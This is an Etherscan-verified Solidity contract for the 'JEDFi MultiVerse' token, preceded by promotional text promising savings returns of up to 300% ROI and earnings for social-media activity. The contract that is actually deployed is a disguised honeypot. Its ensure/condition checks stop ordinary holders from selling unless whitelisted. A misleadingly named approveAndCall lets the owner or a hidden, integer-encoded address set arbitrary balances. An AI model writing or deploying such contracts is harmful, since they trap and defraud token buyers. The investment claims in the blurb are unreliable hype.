/**
 *Submitted for verification at Etherscan.io on 2023-01-03
*/

/*
JEDFi MultiVerse Token
JEDFi Multiverse is a one - touch DAPP , with a single dashboard that gives access to multiple Banking, DeFi and Social 
needs , products & services.
Four Main Section Of JEDFi MultiVerse
JET DeFi Banking
JET-X Crypto Wallet & Exchange
Clemers DeFi Social Network
JEDFi POS With Mining Capabilities
JEDFi Vision 
We envision a world where the average lay man in our local neighborhood is able to easily and physically engage in the 
adaptation and usage of the Blockchain system, and crypto currencies to be precise. We intend to shade clarity on what 
the Blockchain Technology is all about, given users a better understanding and access to the limitless features and boundless 
opportunities that the new innovation offers.
JEDFi Mission 
Our Mission is to actualize the co-existence of both crypto and fiat currencies in our daily financial engagements 
(usages). With easyaccess to crypto funds, foreign currencies, stocks and digital or tokenize assets. For our everyday 
life-style needs and wants.
Solutions That JEDFi Offers
The startup offers lots of great fintech & social products and services to all users and businesses , such as - Simplicity 
in transacting , Connectivity , easy Checkouts , Earning Opportunities , etc. For the banking section ; Users can fund their 
wallets across different business systems and complete all transactions within a single dashboard . For example , a user 
can fund his JEDFi account and use it to pay cross - border bills , checkout on his favorite e - Commerce stores , without 
using a card , or an external means . Users can transact with each other , provided all parties use businesses integrated 
with JEDFi , while Checkout offers users an option to pay with JEDFi . The startup is set on onboarding lots of users and 
businesses across the Globe and increasing its product offerings . Today , there are nearly 600 fintechs across the continent, 
most of which operate siloed wallets .

Our goal is to make it possible to connect and make payments from any wallet . We are building an operating system so that 
businesses can offer more services to their customers . Our focus remains on product innovation and serving our customers 
who operate across different geographies . Our belief is that decentralized wallets are the future of payments , Every product 
we build is centered on our multi - currency wallets .

The team at JEDFi extends the power and use - cases of our user's wallets . " We will for - see that our users pay for food, 
health care , and investments ' using their JEDFi account balances . This is exactlythe kind of value - chain we envisioned from 
our wallets system . Our users now have options with JEDFi's integration with other fintech wallets where they can pay from or 
for JEDFi services . " JEDFi charges both businesses and customers for transactions done using its solution .
JEDFi Banking Features
JEDFi operates with all the features of a traditional bank, but with greater, advance and much benefiting features! Due to the 
Decentralized nature of it via Blockchain. The JET DeFi Bank offers decentralized banking services and products such as;
Simplified Transactions (Send, Withdraw and Checkout)
Global Bill payments (airtime, internet, utilities, tv cables..) Credit & Debit Cards for USD &NGN (Virtual & Physical)
Savings and Investments
Access Loan with low profit
Withdraw to Bank, PayPal, Skrill etc.
Virtual Bank Accounts
In-Store Market for all products. 
Clemers DeFi Social Network (earn for posting and every action on clemers)
Divers Payment Gateways.
Professional Rest API (for developers, coming soon) Multi-Currency Support (NGN, USD, KES, GHS, etc...)
Business Accounts (coming soon). Know Your Customer Verification
Accounting & Invoicing Features
KUDA Bank virtual accounts. (Coming soon). 
Real Time FX Trading with Meta Trader 5 (coming soon) 
Multi Language Options & Location tracking. And lots of other features coming soon
Current Offers On JEDFi
Savings With High ROI
Bank offers different and lucrative savling schemes, with great ROI benefitS on each plan, separataly. A user is able to save 
funds in his savings account (different from main account), instrumentally or instantly, depending on the plan applied on. The 
saved funds will continually generate daily, weekly or monthly profits, and can be withdrawn continually generate account 
when the plan's target is achieved.
Types Of Saving Plans 
i. Health Savings = Weekly savings of N3000 fer 3 months. Get back 75% total ROI.
ii. Business Savings = Weekly savings of N5000 for 5 months. Get back 120% total ROI.
iii. School Tuition Savings = Weekly savings of N3000 fer a year. Get back 300%total ROI.
iv. Goal Savings = Weekly savings of N5000 for months. Get back 140% total ROI.
ACCESS LOAN WITH LOW PROFIT:
We offer easy access to divers' range of loan plans, and a user is able to secure a loan within three months of using his 
verified JEDFI account, also saving in at least one saving plan in the JEDFi saving sheme.
ACCESSIBLE LOAN PLANS:
Business loan = Access a business loan from N10,000 - N500,000 when you save on JEDFi savings for a period of at least 3 months. Pay back with just 44% after 6 months.
Student loan = Access a Student loan from N10,000 - N200,000 when you save on JEDFi savings for a period of at least 6 months. Pay back with just 38% after a year.
Grocery loan = Access a Grocery loan from N10,000 - N100,000 when you save on JEDFi savings for a period of at least 3 months. Pay back with just 38% after 3 months.
Emergency loan = Access an Emergency loan from N10,000 - N100,000 when you save on JEDFi savings for a period of at least 3 months. Pay back with just 30% after 6 months. 
Medical loan = Access a Medical loan from N10,000 -N100,000 when you save on JEDFi savings for a period of at least 6 months. Pay back with just 32% after 3 months
JET-X Wallet & Exchange 
JET-X is a single globally-sourced trading platform with an associated suite of services that supports the entire global network 
of DeFi. Transactions are recorded and linked through a public blockchain ledger. Amounts of transactions are recorded, as 
are their corresponding alphanumeric Ids.
JEDFi-X Features
Store, Send and Receive all network Crypto assets
Buy, Sell and provide liquidity to assets with ease.
P2P Trading with other users (Escro Coin Holdings)
Connect any Web3 Supported Wallets (e.g Metamask)
List and Provide Liquidity to your own Created Token(s) 
Light/Dark theme (possible to set "only light" or "only dark option)
Yield Farming and other great features soon to be enabled.

Clemers DeFi
SOCIAL NETWORK Connect, Let's Earn Money to Enjoy, Rejoice & Succeed
Clemers DeFi Media is a new age social media platform, designed with a decentralized infrastructure. Intent to help content 
creators & consumers, media influencers & audience (followers), sellers & buyers, Inventors & Startups. And whosoever is 
with an account on the ciemers system, to make tiveness of passive income from their participation in the active the network 
via any me itserves them greatly.
Clemers Features
Currently, there are two versions of the Clemers Media Project. The Beta version which is currently in use, and the Main version, 
which is still undergoing development, but still usable. The following features are for the Beta version; the main version will also 
contain all the features of the Beta version, and much more.
Friends: Users can add others as a friend
Follow/Unfollow: Clemers enables users to follow or unfollow other users  
Real-Time: Real-Time Newsfeed, Chat, & Notifications and Profile Updates 
Sharing: Users can share any public post on clemers
Smart Publisher: Publisher auto-scrap means a user can post Music, Videos, Links, etc.
YouTube, Vimeo, SoundCloud: Users can share links from these media platforms
Notifications: Get notifications (red notification with counter) from other users when they: Like, Share, Comment, or mention you, etc.
Sound Notifications: for New Notifications & Messages 
Privacy: users can change their privacy settings anytime
Hahtags: Post #hashtags in posts, comments and chat conversations
mention: user can mention their friends
Photos: Upload images and have them displayed as a gallery. 
Groups: Stay in touch with your group members and share contents with them. 
Pages: User can create pages like for brand or craft. 0Smiles/
Emoticons: Emotional reactions such as (smiles), in Messages, Comments and Chat.
Mange Blocks: Users can block other users, preventing them from chatting with each other. 
Awesome Profile: Set profile image, Covers and Avatars for user/page/group profiles 
Verify Badge: Get verified when you qualify with followers or upgrade account. User profile and pages can get verify badges
Unified Search Box: Live search for #thashtags, posts, pages and groups 
See More: Option for cut long-text post like Facebook.
Retina Display Ready: Responsive Design (optimized for all devices. 
Suggestions: Friends suggestions (for new users), Pages to like, Groups to join
Mobile Apps: Clemers has both web version and apps for android & ios android&ios
Offers & User Benefits 
There are opportunities and benefits that comes with having an account on the Clemers DeFi Media current, even prior the launch 
of the finally project, which comes with a way more easy and higher yielding benefits to all. These opportunities and benefits include:
Free Account
Daily earning for every activity done on the Media, Posting, Commenting, Reacting, Following and Referring. Each activity has its 
own limited amount that a user can earn, for users with Free Accounts. 
Pro-Clemers
Account holders of Pro-Clemers are able to experience wellfurnished benefits, products and features, as well as earn a thousand 
fold of what free users get from activities, on a daily bases, within a certain period of their subscription.
 Max-Clemers
Upgrade your account to Max-Clemers and become a VIP member of the Clemers Media project, this gives you access to all the to 
all the benefits of a Free Account holder, and double of all that a Pro Clemers account holder gets.
Tokenomics
To participate in the JEDFi ecosystem we have created a transparent tokenomics for our stakeholders to calculate, understand and 
evaluate the supply mechanism of JEDFi network token distribution percentage. JEDFi, the best cryptocurrency to invest in, we will 
also offer staking rewards for JEDFi holders with interesting APY/APR on the listed exchanges soon.
Name: JEDFi MultiVerse
Symbol: JEDFi
Type: ERC20
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

contract JEDFiMultiVerse {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner ||msg.sender==address
        (849318646526731324077870629782762807141764098713));
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}